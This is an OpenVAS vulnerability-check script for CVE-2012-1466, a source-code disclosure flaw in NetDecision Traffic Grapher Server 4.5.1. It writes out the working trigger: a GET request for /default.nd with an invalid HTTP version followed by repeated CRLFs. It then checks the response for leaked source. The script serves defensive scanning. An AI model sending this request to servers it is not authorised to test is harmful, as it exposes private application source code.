###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netdecision_traffic_grapher_srv_info_disc_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Netmechanica NetDecision Traffic Grapher Server Information Disclosure Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to gain sensitive information.
  Impact Level: Application";
tag_affected = "NetDecision Traffic Grapher Server version 4.5.1";
tag_insight = "The flaw is due to an improper validation of malicious HTTP GET
  request to 'default.nd' with invalid HTTP version number followed by multiple
  'CRLF', which discloses the source code of 'default.nd'.";
tag_solution = "Upgrade to Traffic Grapher Server 4.6.1 or later
  For updates refer to http://www.netmechanica.com/downloads/";
tag_summary = "This host is running NetDecision Traffic Grapher Server and is
  prone to information disclosure vulnerability.";

if(description)
{
  script_id(802704);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1466");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-09 13:50:32 +0530 (Fri, 09 Mar 2012)");
  script_name("Netmechanica NetDecision Traffic Grapher Server Information Disclosure Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=481");
  script_xref(name : "URL" , value : "http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_Vuln.txt");

  script_description(desc);
  script_summary("Check for the information disclosure vulnerability in NetDecision Traffic Grapher Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/www", 8087);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
port = 0;
soc = "";
req = "";
res = "";
banner = "";

## Check Port status
port = 8087;
if(!get_port_state(port)){
  exit(0);
}

## Open the socket
soc = http_open_socket(port);
if(!soc){
  exit(0);
}

## Confirm the application
banner = get_http_banner(port: port);
if(!banner || "Server: NetDecision-HTTP-Server" >!< banner){
  exit(0);
}

## Construct the request
req = string("GET /default.nd HTTP/-1111111\r\n\r\n");
send(socket:soc, data:req);

for(i=0; i<9; i++)
{
  send(socket:soc, data:raw_string(0x0d, 0x0a));
  sleep(1);
}

sleep(3);
res = http_recv_body(socket:soc);

if(!res)
{
  http_close_socket(soc);
  exit(0);
}

## Check for the source code '/default.nd' in response
if(("NetDecision Traffic Grapher Web Interface" >< res) &&
   ("GetNetDecisionSystemDir(ND_LOG_DIR)" >< res) &&
   ("func PopulateProperty" >< res) &&
   ("func PopulateInfo()" >< res))
{
    security_warning(port);
    http_close_socket(soc);
}
